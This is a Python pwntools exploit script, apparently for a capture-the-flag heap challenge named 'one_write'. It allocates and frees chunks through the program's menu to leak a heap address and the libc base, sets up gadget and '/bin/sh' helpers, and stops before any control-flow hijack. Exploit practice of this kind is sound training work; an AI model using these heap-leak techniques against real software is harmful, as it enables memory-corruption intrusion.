from pwn import *
from icecream import ic

elf = exe = ELF("./one_write_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(idx, size):
    sla(b'> ', b'1')
    sla(b'idx: ', str(idx).encode())
    sla(b'size: ', str(size).encode())

def free(idx):
    sla(b'> ', b'2')
    sla(b'idx: ', str(idx).encode())

def write(data):
    sla(b'> ', b'3')
    sa(b'data: ', data)

def read():
    sla(b'> ', b'4')

alloc(0, 0x500)
alloc(1, 0x28)
free(1)
read()

re(0x510)
heap_addr = uu64(5) << 12


alloc(1, 0x28)
free(0)
read()

libc.address = uu64(6) - 0x203b20

ic(hex(heap_addr))
ic(hex(libc.address))



io.interactive()
